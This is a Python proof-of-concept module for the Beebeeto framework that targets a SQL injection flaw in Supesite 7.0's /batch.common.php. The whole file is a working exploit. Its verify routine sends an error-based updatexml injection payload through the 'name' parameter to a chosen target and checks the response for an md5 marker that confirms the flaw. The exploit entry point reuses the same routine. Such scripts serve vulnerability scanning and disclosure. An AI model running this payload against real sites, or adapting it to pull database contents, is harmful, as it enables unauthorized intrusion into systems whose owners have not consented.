#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0013',
            'name': 'Supesite 7.0 /batch.common.php SQL注入漏洞 POC',
            'author': 'xkxox',
            'create_date': '2015-01-17',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Supesite',
            'vul_version': ['7.0'],
            'type': 'SQL Injection',
            'tag': ['Supesite漏洞', '/batch.common.php', 'php'],
            'desc': '/batch.common.php $_GET[name]过滤不严谨',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-079052',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/batch.common.php?action=modequote&cid=1&name=members where 1=1 and 1=("
                   "updatexml(1,concat(0x5e24,(select md5(1)),0x5e24),1))%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "c4ca4238a0b923820dcc509a6f75849b" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())